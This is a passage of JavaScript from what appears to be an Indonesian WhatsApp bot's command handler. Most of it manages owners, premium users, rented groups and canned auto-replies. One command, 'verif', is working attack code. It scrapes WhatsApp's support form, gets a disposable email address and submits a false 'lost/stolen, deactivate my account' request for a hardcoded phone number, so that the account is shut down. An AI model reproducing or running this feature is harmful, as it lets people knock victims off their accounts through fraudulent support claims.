require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/OWNER/indexByReply")(sock, m, prefix, command, mentionByReply, setQuoted) 
} else if (mentionByTag[0] && m.isGroup) {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/OWNER/indexByTag")(sock, m, prefix, command, mentionByTag, setQuoted) 
} else if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/OWNER/indexByNumber")(sock, m, prefix, command, text, setQuoted) 
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
if (text.split("|")[0] && text.split("|")[1] == "permanent") {
db.data.expired[botNumber].vip[text.split("|")[0]] = {
date: calender, 
expired: "INFINITY"
}
setReply(mess.cmd.addowner.text1(text.split("|")[0]))
} else {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/OWNER/index")(sock, m, prefix, command, text, setQuoted)
}
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
let teks = text.split("|")[1] == "seconds"? mess.time.seconds : text.split("|")[1] == "minutes"? mess.time.minutes : text.split("|")[1] == "hours"? mess.time.hours : text.split("|")[1] == "days"? mess.time.days : text.split("|")[1] == "weeks"? mess.time.weeks : text.split("|")[1] == "months"? mess.time.months : ""
let time = text.split("|")[2] + text.split("|")[1] == "1months"? "30days" : text.split("|")[2] + text.split("|")[1] == "2months"? "60days" : text.split("|")[2] + text.split("|")[1] == "3months"? "90days" : text.split("|")[2] + text.split("|")[1] == "4months"? "120days" : text.split("|")[2] + text.split("|")[1] == "5months"? "150days" : text.split("|")[2] + text.split("|")[1] == "6months"? "180days" : text.split("|")[2] + text.split("|")[1] == "7months"? "210days" : text.split("|")[2] + text.split("|")[1] == "8months"? "240days" : text.split("|")[2] + text.split("|")[1] == "9months"? "270days" : text.split("|")[2] + text.split("|")[1] == "10months"? "300days" : text.split("|")[2] + text.split("|")[1] == "11months"? "330days" : text.split("|")[2] + text.split("|")[1] == "12months"? "360days" : text.split("|")[2] + text.split("|")[1]
db.data.expired[botNumber].owner[text.split("|")[0]] = {
date: calender, 
expired: Date.now() + toMs(time)
}
setReply(mess.cmd.addowner.text2(text.split("|")[0], text.split("|")[2], teks))
} else setReply(mess.input)
}
break
case "addpremium":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner()
if (mentionByReply) {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/PREMIUM/indexByReply")(sock, m, prefix, command, mentionByReply, setQuoted) 
} else if (mentionByTag[0] && m.isGroup) {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/PREMIUM/indexByTag")(sock, m, prefix, command, mentionByTag, setQuoted) 
} else if (text.split("|")[0] && !text.split("|")[1] && !text.split("|")[2]) {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/PREMIUM/indexByNumber")(sock, m, prefix, command, text, setQuoted) 
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
if (text.split("|")[0] && text.split("|")[1] == "permanent") {
db.data.expired[botNumber].premium[text.split("|")[0]] = {
date: calender, 
expired: "INFINITY"
}
setReply(mess.cmd.addpremium.text1(text.split("|")[0]))
} else {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/PREMIUM/index")(sock, m, prefix, command, text, setQuoted)
}
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
let teks = text.split("|")[1] == "seconds"? mess.time.seconds : text.split("|")[1] == "minutes"? mess.time.minutes : text.split("|")[1] == "hours"? mess.time.hours : text.split("|")[1] == "days"? mess.time.days : text.split("|")[1] == "weeks"? mess.time.weeks : text.split("|")[1] == "months"? mess.time.months : ""
let time = text.split("|")[2] + text.split("|")[1] == "1months"? "30days" : text.split("|")[2] + text.split("|")[1] == "2months"? "60days" : text.split("|")[2] + text.split("|")[1] == "3months"? "90days" : text.split("|")[2] + text.split("|")[1] == "4months"? "120days" : text.split("|")[2] + text.split("|")[1] == "5months"? "150days" : text.split("|")[2] + text.split("|")[1] == "6months"? "180days" : text.split("|")[2] + text.split("|")[1] == "7months"? "210days" : text.split("|")[2] + text.split("|")[1] == "8months"? "240days" : text.split("|")[2] + text.split("|")[1] == "9months"? "270days" : text.split("|")[2] + text.split("|")[1] == "10months"? "300days" : text.split("|")[2] + text.split("|")[1] == "11months"? "330days" : text.split("|")[2] + text.split("|")[1] == "12months"? "360days" : text.split("|")[2] + text.split("|")[1]
db.data.expired[botNumber].premium[text.split("|")[0]] = {
date: calender, 
expired: Date.now() + toMs(time)
}
setReply(mess.cmd.addpremium.text2(text.split("|")[0], text.split("|")[2], teks))
} else setReply(mess.input)
}
break
case "addsewa":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner()
if (m.isGroup && !text.split("|")[1] && !text.split("|")[2]) {
if (text.includes("https://chat.whatsapp.com/")) {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/SEWA/indexByPc")(sock, m, prefix, command, text, setQuoted)
} else {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/SEWA/indexByGroup")(sock, m, prefix, command, setQuoted)
}
} else if (!m.isGroup && !text.split("|")[1] && !text.split("|")[2]) {
if (!text) return setReply(mess.query.link)
if (!text.includes("https://chat.whatsapp.com/")) return setReply(mess.cmd.addsewa.linkgc)
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/SEWA/indexByPc")(sock, m, prefix, command, text, setQuoted)
} else if (text.split("|")[0] && text.split("|")[1] && !text.split("|")[2]) {
if (text.split("|")[0] && text.split("|")[1] == "permanent") {
const groupMet = await sock.groupMetadata(text.split("|")[0])
db.data.expired[botNumber].sewa[text.split("|")[0]] = {
date: calender, 
expired: "INFINITY"
}
setReply(mess.cmd.addsewa.text1(groupMet.subject))
} else {
require("../../../ACTION/STORAGE/APP/SCR/EXPIRED/SEWA/index")(sock, m, prefix, command, text, setQuoted)
}
} else if (text.split("|")[0] && text.split("|")[1] && text.split("|")[2]) {
let teks = text.split("|")[1] == "seconds"? mess.time.seconds : text.split("|")[1] == "minutes"? mess.time.minutes : text.split("|")[1] == "hours"? mess.time.hours : text.split("|")[1] == "days"? mess.time.days : text.split("|")[1] == "weeks"? mess.time.weeks : text.split("|")[1] == "months"? mess.time.months : ""
let time = text.split("|")[2] + text.split("|")[1] == "1months"? "30days" : text.split("|")[2] + text.split("|")[1] == "2months"? "60days" : text.split("|")[2] + text.split("|")[1] == "3months"? "90days" : text.split("|")[2] + text.split("|")[1] == "4months"? "120days" : text.split("|")[2] + text.split("|")[1] == "5months"? "150days" : text.split("|")[2] + text.split("|")[1] == "6months"? "180days" : text.split("|")[2] + text.split("|")[1] == "7months"? "210days" : text.split("|")[2] + text.split("|")[1] == "8months"? "240days" : text.split("|")[2] + text.split("|")[1] == "9months"? "270days" : text.split("|")[2] + text.split("|")[1] == "10months"? "300days" : text.split("|")[2] + text.split("|")[1] == "11months"? "330days" : text.split("|")[2] + text.split("|")[1] == "12months"? "360days" : text.split("|")[2] + text.split("|")[1]
let groupMet = await sock.groupMetadata(text.split("|")[0])
db.data.expired[botNumber].sewa[text.split("|")[0]] = {
date: calender, 
expired: Date.now() + toMs(time)
}
setReply(mess.cmd.addsewa.text2(groupMet.subject, text.split("|")[2], teks))
}
} 
break
case "addcmdowner":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkDataName("owner", dataId)) { sock.createDataId("owner", dataId) }
if (sock.checkDataId("owner", text, dataId)) return setReply(mess.cmd.addcmdowner.query)
sock.addDataId("owner", text, dataId)
setReply(mess.cmd.addcmdowner.text(text))
}
break
case "addcmdpremium":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkDataName("premium", dataId)) { sock.createDataId("premium", dataId) }
if (sock.checkDataId("premium", text, dataId)) return setReply(mess.cmd.addcmdpremium.query)
sock.addDataId("premium", text, dataId)
setReply(mess.cmd.addcmdpremium.text(text))
}
break
case "addcmdlimit":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkDataName("limit", dataId)) { sock.createDataId("limit", dataId) }
if (sock.checkDataId("limit", text, dataId)) return setReply(mess.cmd.addcmdlimit.query)
sock.addDataId("limit", text, dataId)
setReply(mess.cmd.addcmdlimit.text(text))
}
break
case "delerror":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkErrorCmd(text, listerror)) return setReply(mess.cmd.delerror.query)
sock.deleteError(text, listerror)
setReply(mess.cmd.delerror.text(text))
}
break
case "delstick":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.text)
if (!db.data.sticker[text]) return setReply(mess.cmd.delstick.query)
delete db.data.sticker[text]
setReply(mess.cmd.delstick.text(text))
}
break
case "delvn":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.text)
if (!db.data.audio[text]) return setReply(mess.cmd.delvn.query)
delete db.data.audio[text]
setReply(mess.cmd.delvn.text(text))
}
break
case "delowner":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner()
if (!Input) return setReply(mess.input)
if (![...Object.keys(db.data.expired[botNumber].owner), ...Object.keys(db.data.expired[botNumber].vip)].includes(Input)) return setReply(mess.cmd.delowner.query)
if ([...Object.keys(db.data.expired[botNumber].vip)].includes(Input)) {
delete db.data.expired[botNumber].vip[Input]
} else {
delete db.data.expired[botNumber].owner[Input]
}
setReply(mess.cmd.delowner.text(Input))
}
break
case "delpremium":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner()
if (!Input) return setReply(mess.input)
if (!db.data.expired[botNumber].premium[Input]) return setReply(mess.cmd.delpremium.query)
delete db.data.expired[botNumber].premium[Input]
setReply(mess.cmd.delpremium.text(Input))
}
break
case "delsewa":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner()
if (m.isGroup) {
if (!db.data.expired[botNumber].sewa[m.chat]) return setReply(mess.cmd.delsewa.query)
delete db.data.expired[botNumber].sewa[m.chat]
setReply(mess.cmd.delsewa.text(groupName))
} else if (!m.isGroup) {
if (!text) return setReply(mess.query.link)
if (!text.includes("https://chat.whatsapp.com/")) return setReply(mess.cmd.delsewa.linkgc)
let ano = text.split("https://chat.whatsapp.com/")[1]
let nana = await sock.groupAcceptInvite(ano)
if (!db.data.expired[botNumber].sewa[nana]) return setReply(mess.cmd.delsewa.query)
let groupMet = await sock.groupMetadata(nana)
delete db.data.expired[botNumber].sewa[nana]
setReply(mess.cmd.delsewa.text(groupMet.subject))
}
}
break
case "delcmdowner":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkDataName("owner", dataId)) { sock.createDataId("owner", dataId) }
if (!sock.checkDataId("owner", text, dataId)) return setReply(mess.cmd.delcmdowner.query)
sock.removeDataId("owner", text, dataId)
setReply(mess.cmd.delcmdowner.text(text))
}
break
case "delcmdpremium":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkDataName("premium", dataId)) { sock.createDataId("premium", dataId) }
if (!sock.checkDataId("premium", text, dataId)) return setReply(mess.cmd.delcmdpremium.query)
sock.removeDataId("premium", text, dataId)
setReply(mess.cmd.delcmdpremium.text(text))
}
break
case "delcmdlimit":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
if (!text) return setReply(mess.query.cmd)
if (!sock.checkDataName("limit", dataId)) { sock.createDataId("limit", dataId) }
if (!sock.checkDataId("limit", text, dataId)) return setReply(mess.cmd.delcmdlimit.query)
sock.removeDataId("limit", text, dataId)
setReply(mess.cmd.delcmdlimit.text(text))
}
break
case "listerror":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "「 *LIST ERROR* 」\n"
for (let x of listerror) {
teks += `_*Command*_ : ${x.cmd}\n_*System Error*_ : ${x.error}\n\n*]─────────────────[*\n\n`
}
teks += `\n*Total ada : ${listerror.length}*`
setReply(teks)
}
break
case "liststick":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "┌──⭓「 *LIST STICKER* 」\n│\n"
let data = Object.keys(db.data.sticker)
for (let x of data) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
break
case "listvn":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "┌──⭓「 *LIST VN* 」\n│\n"
let data = Object.keys(db.data.audio)
for (let x of data) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
break
case "listowner":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "「 *LIST OWNER* 」\n\n"
let data = [...Object.keys(db.data.expired[botNumber].owner), ...Object.keys(db.data.expired[botNumber].vip)]
for (let x of data) {
if (Object.keys(db.data.expired[botNumber].vip).includes(x)) {
var cekvip = db.data.expired[botNumber].vip[x].expired == "INFINITY"? "PERMANENT" : `${ms(db.data.expired[botNumber].vip[x].expired - Date.now()).days} ${mess.time.days} ${ms(db.data.expired[botNumber].vip[x].expired - Date.now()).hours} ${mess.time.hours} ${ms(db.data.expired[botNumber].vip[x].expired - Date.now()).minutes} ${mess.time.minutes} ${ms(db.data.expired[botNumber].vip[x].expired - Date.now()).seconds} ${mess.time.seconds}`
var date = db.data.expired[botNumber].vip[x].date
} else if (Object.keys(db.data.expired[botNumber].owner).includes(x)) {
var cekvip = db.data.expired[botNumber].owner[x].expired == "INFINITY"? "PERMANENT" : `${ms(db.data.expired[botNumber].owner[x].expired - Date.now()).days} ${mess.time.days} ${ms(db.data.expired[botNumber].owner[x].expired - Date.now()).hours} ${mess.time.hours} ${ms(db.data.expired[botNumber].owner[x].expired - Date.now()).minutes} ${mess.time.minutes} ${ms(db.data.expired[botNumber].owner[x].expired - Date.now()).seconds} ${mess.time.seconds}`
var date = db.data.expired[botNumber].owner[x].date
}
teks += `*Number* : @${x.split("@")[0]}\nDate : ${date}\n*Expired* : ${cekvip}\n\n`
}
teks += `\n*Total ada : ${data.length}*`
setReply(teks)
}
break
case "listpremium":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "「 *LIST PREMIUM* 」\n\n"
let data = Object.keys(db.data.expired[botNumber].premium)
for (let x of data) {
let cekvip = db.data.expired[botNumber].premium[x].expired == "INFINITY"? "PERMANENT" : `${ms(db.data.expired[botNumber].premium[x].expired - Date.now()).days} ${mess.time.days} ${ms(db.data.expired[botNumber].premium[x].expired - Date.now()).hours} ${mess.time.hours} ${ms(db.data.expired[botNumber].premium[x].expired - Date.now()).minutes} ${mess.time.minutes} ${ms(db.data.expired[botNumber].premium[x].expired - Date.now()).seconds} ${mess.time.seconds}`
teks += `*Number* : @${x.split("@")[0]}\nDate : ${db.data.expired[botNumber].premium[x].date}\n*Expired* : ${cekvip}\n\n`
}
teks += `\n*Total ada : ${data.length}*`
setReply(teks)
}
break
case "listsewa":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "「 *LIST SEWA* 」\n\n"
let data = Object.keys(db.data.expired[botNumber].sewa)
for (let x of data) {
try{
let groupMetadata2 = await sock.groupMetadata(x)
let participants2 = await groupMetadata2.participants
var groupName2 = groupMetadata2.subject
var groupOwner2 = groupMetadata2.owner
var creation2 = moment(groupMetadata2.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")
var member2 = await participants2.map((x) => x.id).length
let groupAdmins2 = await participants2.filter(v => v.admin !== null).map(v => v.id)
var isBotGroupAdmins2 = groupAdmins2.includes(botNumber)
} catch {
var groupName2 = "Tidak diketahui"
var groupOwner2 = "undefined"
var creation2 = "Tidak diketahui"
var member2 = 0
var isBotGroupAdmins2 = false
}
if (isBotGroupAdmins2) {
let linkgc = await sock.groupInviteCode(x)
var url = `https://chat.whatsapp.com/${linkgc}`
} else {
var url = "Botz Is Not Admin"
}
let cekvip = db.data.expired[botNumber].sewa[x].expired == "INFINITY"? "PERMANENT" : `${ms(db.data.expired[botNumber].sewa[x].expired - Date.now()).days} ${mess.time.days} ${ms(db.data.expired[botNumber].sewa[x].expired - Date.now()).hours} ${mess.time.hours} ${ms(db.data.expired[botNumber].sewa[x].expired - Date.now()).minutes} ${mess.time.minutes} ${ms(db.data.expired[botNumber].sewa[x].expired - Date.now()).seconds} ${mess.time.seconds}`
teks += `*Name Group* : ${groupName2}\n*Owner* : ${groupOwner2 !== undefined ? "@" + groupOwner2.split("@")[0] : "Tidak diketahui"}\n*Creation* : ${creation2}\n*Total Members* : ${member2}\n*Data* : ${db.data.expired[botNumber].sewa[x].date}\n*Expired* : ${cekvip}\n*Link* : ${url}\n\n`
}
teks += `\n*Total ada : ${data.length}*`
setReply(teks)
}
break
case "listcmdowner":{
if (m.isGroup && !isSewa) return onlySewa()
if (!sock.checkDataName("owner", dataId)) { sock.createDataId("owner", dataId) }
let nana = await dataId.filter(item => item.name == "owner")
let teks = "┌──⭓「 *LIST COMMAND OWNER* 」\n│\n"
let nunu = nana[0].id
for(let x of nunu){
teks += `│⭔ ${prefix + x}\n`
}    
teks += `│\n└────────────⭓\n\n*Total ada : ${nunu.length}*`
setReply(teks)
}
break
case "listcmdpremium":{
if (m.isGroup && !isSewa) return onlySewa()
if (!sock.checkDataName("premium", dataId)) { sock.createDataId("premium", dataId) }
let nana = await dataId.filter(item => item.name == "premium")
let teks = "┌──⭓「 *LIST COMMAND PREMIUM* 」\n│\n"
let nunu = nana[0].id
for(let x of nunu){
teks += `│⭔ ${prefix + x}\n`
}    
teks += `│\n└────────────⭓\n\n*Total ada : ${nunu.length}*`
setReply(teks)
}
break
case "listcmdlimit":{
if (m.isGroup && !isSewa) return onlySewa()
if (!sock.checkDataName("limit", dataId)) { sock.createDataId("limit", dataId) }
let nana = await dataId.filter(item => item.name == "limit")
let teks = "┌──⭓「 *LIST COMMAND LIMITS* 」\n│\n"
let nunu = nana[0].id
for(let x of nunu){
teks += `│⭔ ${prefix + x}\n`
}    
teks += `│\n└────────────⭓\n\n*Total ada : ${nunu.length}*`
setReply(teks)
}
break
case "listuser":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "┌──⭓「 *LIST USER* 」\n│\n"
let data = Object.keys(db.data.users)
for (let x of data) {
teks += `│⭔ ${x.split("@")[0]}\n`
}
teks += `│\n└────────────⭓\n\n*Total ada : ${data.length}*`
setReply(teks)
}
break
case "listban":{
if (m.isGroup && !isSewa) return onlySewa()
let teks = "「 *LIST BANNED* 」\n"
for (let x of banned) {
teks += `*NAME* : ${x.name}\n*NUMBER* : wa.me/${x.id}\n*REASON* : ${x.reason}\n*DATE* : ${x.date}\n\n`
}
teks += `\n*Total ada : ${banned.length}*`
setReply(teks)
}
break
case "listblockcmd":{
if (m.isGroup && !isSewa) return onlySewa()
if (!sock.checkDataName("blockcmd", dataId)) { sock.createDataId("blockcmd", dataId) }
let nana = await dataId.filter(item => item.name == "blockcmd")
let teks = "┌──⭓「 *LIST BLOCK CMD* 」\n│\n"
let nunu = nana[0].id
for(let x of nunu){
teks += `│⭔ ${x}\n`
}    
teks += `│\n└────────────⭓\n\n*Total ada : ${nunu.length}*`
setReply(teks)
}
break
case "clearallerror":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner()
sock.clearAllData(listerror)
setReply(mess.success)
break    
case "clearallstick":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
db.data.sticker = {}
setReply(mess.success)
break
case "clearallvn":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
db.data.audio = {}
setReply(mess.success)
break
case "clearallowner":
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner() 
db.data.expired[botNumber].owner = {}
setReply(mess.success)
break
case "clearallpremium":
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner() 
db.data.expired[botNumber].premium = {}
setReply(mess.success)
break
case "clearallsewa":
if (m.isGroup && !isSewa) return onlySewa()
if (!isCreator && !m.key.fromMe) return onlyOwner() 
db.data.expired[botNumber].sewa = {}
setReply(mess.success)
break
case "clearallcmdowner":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (!sock.checkDataName("owner", dataId)) { sock.createDataId("owner", dataId) }
let nana = await dataId.filter(item => item.name == "owner")
let nunu = nana[0].id
for(let x of nunu){
sock.removeDataId("owner", x, dataId)
setReply(mess.success)
}
}
break
case "clearallcmdpremium":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (!sock.checkDataName("premium", dataId)) { sock.createDataId("premium", dataId) }
let nana = await dataId.filter(item => item.name == "premium")
let nunu = nana[0].id
for(let x of nunu){
sock.removeDataId("premium", x, dataId)
setReply(mess.success)
}
}
break
case "clearallcmdlimit":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (!sock.checkDataName("limit", dataId)) { sock.createDataId("limit", dataId) }
let nana = await dataId.filter(item => item.name == "premium")
let nunu = nana[0].id
for(let x of nunu){
sock.removeDataId("limit", x, dataId)
setReply(mess.success)
}
}
break
case "clearalluser":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
db.data.users = {}
setReply(mess.success)
break
case "clearallban":
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
sock.clearAllData(banned)
setReply(mess.success)
break
case "clearallblockcmd":{
if (m.isGroup && !isSewa) return onlySewa()
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (!sock.checkDataName("blockcmd", dataId)) { sock.createDataId("blockcmd", dataId) }
let nana = await dataId.filter(item => item.name == "blockcmd")
let nunu = nana[0].id
for(let x of nunu){
sock.removeDataId("blockcmd", x, dataId)
setReply(mess.success)
}
}
break
//=========================[ FUTURE BUG ]=========================\\
case "verif":{
if (!isOwner && !m.key.fromMe) return onlyOwner() 
if (!Input) return setReply(mess.input)
let ntah = await axioss.get("https://www.whatsapp.com/contact/noclient/")
let email = await axioss.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")
let cookie = ntah.headers["set-cookie"].join("; ")
let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "INDONESIA")
form.append("phone_number", '+6285877977696',)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "Perdido/roubado: desative minha conta")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
url,
method: "POST",
data: form,
headers: {
cookie
}
})
sock.sendMessage(m.chat, { text: util.format(res.data)}, { quoted: setQuoted })
}
break
//=========================[ AKHIR FITURE ]=========================\\
default:
if (isCmd) {
await sock.Nothing(command, dash, allcommand)
let matches = await stringSimilarity.findBestMatch(command, allcommand)
setReply(mess.security.cmd.detect(prefix, command, matches)) 
}
}
//=========================[ DETECT MESSAGE (P) ]=========================\\
if (salam.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
if (isOwner) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, ucapbot, setQuoted)
} else if (db.data.settings[botNumber].autosticker) {
sock.sendSticker(m.chat, stickerPack.ucapsalam, setQuoted)
} else {
setReply("Ucap salam napah")
}
}
//=========================[ DETECT MESSAGE (asalamualaikum) ]=========================\\
if (budy.includes(`ualaikum`) || budy.includes(`u"alaikum`)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, walaikumsalam, setQuoted)
} else if (db.data.settings[botNumber].autosticker) {
sock.sendSticker(m.chat, stickerPack.kumsalam, setQuoted)
} else {
setReply("Walaikumsalam kak")
}
}
//=========================[ DETECT MESSAGE (toxic) ]=========================\\
if (bad.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
if (isOwner) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, astaga, setQuoted)
} else if (db.data.settings[botNumber].autosticker) {
await sock.sendSticker(m.chat, stickerPack.katakasar, setQuoted)
} else {
await setReply("Jangan Toxic Kak")
}
}
//=========================[ DETECT MESSAGE SANGE ]=========================\\
if (dosa.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
if (isOwner) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, sangeya, setQuoted)
} else if (db.data.settings[botNumber].autosticker) {
await sock.sendSticker(m.chat, stickerPack.istigfar, setQuoted)
} else {
await setReply("Astagfirloh oni chan")
}
}
//=========================[ DETECT MESSAGE ]=========================\\
if (katahai.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (db.data.settings[botNumber].autovn) return sock.sendVn(m.chat, moshimos, setQuoted)
}
//=========================[ DETECT MESSAGE TIME ]=========================\\
if (ohayo.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (timeWib >= "11:00" && timeWib <= "23:50") {
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, oahyo, setQuoted)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
}
//=========================[ DETECT MESSAGE TIME ]=========================\\
if (katamalem.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (timeWib >= "06:00" && timeWib <= "17:00") {
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, oyasumi, setQuoted)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
}
//=========================[ DETECT MESSAGE TIME ]=========================\\
if (katasiang.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, koniciwa, setQuoted)
} else {
setReply(`${ucapanWaktu} kak 🙂`)
}
}
//=========================[ DETECT MESSAGE (botz) ]=========================\\
if (badud.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, ucapbot, setQuoted)
} else {
setReply(sock.pickRandom(oawalah))
}
}
//=========================[ DETECT MESSAGE (lopyu) ]=========================\\
if (katalopyou.includes(messagesC)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
if (db.data.settings[botNumber].autovn) {
sock.sendVn(m.chat, lopyoutoo, setQuoted)
} else {
setReply("??")
}
}
//=========================[ DETECT MESSAGE (ownerNumber) ]=========================\\
if (budy.includes("@" + nomerOwner)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
if (isOwner) return
sock.addSpam("NotCase", m.sender.split("@")[0], "5s", antispam)
const kta = ["*Bentar ya kak nanti juga di bales sama ownerku* 😉", "*Tunggu aja kak, entar juga di bales* 😁", "*Iya kak, ada apa tag owner aku nih* 🙂"]
const su = kta[Math.floor(Math.random() * kta.length)]
setReply(su)
}
//=========================[ DETECT MESSAGE (thanks) ]=========================\\
for (let kasih of thanks) {
if (budy.includes(kasih)) {
if (sock.cekSpam("NotCase", m.sender.split("@")[0], antispam)) return
sock.addSpam("NotCase", m.sender.split("@")[0], "10s", antispam)
if (db.data.settings[botNumber].autosticker) return sock.sendSticker(m.chat, stickerPack.samasama, setQuoted)
setReply(`Sama sama kak ${m.pushName}`)
}
}
//=========================[ GREETINGS TIME LOG ]=========================\\
if (timeWib == "04:00:00") {
console.log(chalk.bold.rgb(255, 178, 102)("\x1b[1;31m~\x1b[1;37m> [\x1b[1;32mBOT\x1b[1;37m]"), color("Bentar lagi jam 5 nih kak, Jangan lupa sholat subuh ya kak", "deeppink"))
